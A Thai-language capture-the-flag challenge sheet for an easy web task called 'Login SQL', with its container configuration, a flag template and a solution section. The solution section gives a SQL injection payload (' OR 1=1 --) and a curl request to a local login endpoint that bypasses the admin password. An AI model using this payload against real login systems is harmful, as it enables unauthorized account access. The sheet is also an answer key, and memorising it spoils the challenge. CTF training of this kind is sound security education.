# Login SQL

| Category | Difficulty | Point |
| :-: | :-: | :-: |
| Web Application | Easy | 100 |

ระบบ login อย่างง่ายที่เขียนขึ้นมาสำหรับเรียนรู้ แต่ด้วยความที่ความรู้และประสบการณ์ที่น้อย เขาจึงพลาดเรื่องความปลอดภัยอะไรบางอย่างไป

คุณช่วย login ด้วย username `admin` หน่อยได้ไหม?

Format: `CSUBRU{...}`

---

## Configuration

| Name | Value |
| :- | :- |
| Title | Login SQL |
| Type | Dynamic Container |
| Category | Web |
| Max Attempts Allowed | unlimited |
| Blood Bonus | Enable |
| Container Image | ic-login-sql |
| Service Port | 8080 |
| CPU Limit (0.1 CPUs) | 1 |
| Memory Limit (MB) | 128 |
| Storage Limit (MB) | 128 |

[Configuration]

### Flags

- `CSUBRU{s1mpl3_sq1_1nj3ct10n_[TEAM_HASH]}`

---

## Analysis

username: `admin` password: `' OR 1=1 --` ในการ bypass

ใน server ตัว password จะ random ใหม่ทุกๆครั้ง จึงเป็นไปไม่ได้ที่จะรู้ password

```sh
curl -v -X POST http://localhost:8080/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"' OR 1=1 --\"}"
```
